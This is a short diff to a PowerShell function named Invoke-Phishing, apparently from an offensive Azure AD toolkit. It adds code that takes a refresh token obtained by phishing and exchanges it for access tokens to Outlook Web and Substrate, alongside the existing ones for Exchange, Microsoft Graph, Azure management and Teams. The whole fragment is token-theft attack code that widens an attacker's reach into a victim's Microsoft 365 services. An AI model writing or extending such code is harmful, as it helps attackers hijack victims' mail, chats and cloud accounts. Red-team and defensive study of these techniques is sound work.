@@ -1212,6 +1212,8 @@ function Invoke-Phishing
             "AADGraph" =         $response.access_token
             "refresh_token" =    $response.refresh_token
             "EXO" =              Get-AccessTokenWithRefreshToken -Resource "https://outlook.office365.com"        -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
+            "OWA" =              Get-AccessTokenWithRefreshToken -Resource "https://outlook.office.com"           -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
+            "Substrate" =        Get-AccessTokenWithRefreshToken -Resource "https://substrate.office.com"         -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
             "MSGraph" =          Get-AccessTokenWithRefreshToken -Resource "https://graph.microsoft.com"          -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
             "AZCoreManagement" = Get-AccessTokenWithRefreshToken -Resource "https://management.core.windows.net/" -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
             "Teams" =            Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com"         -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
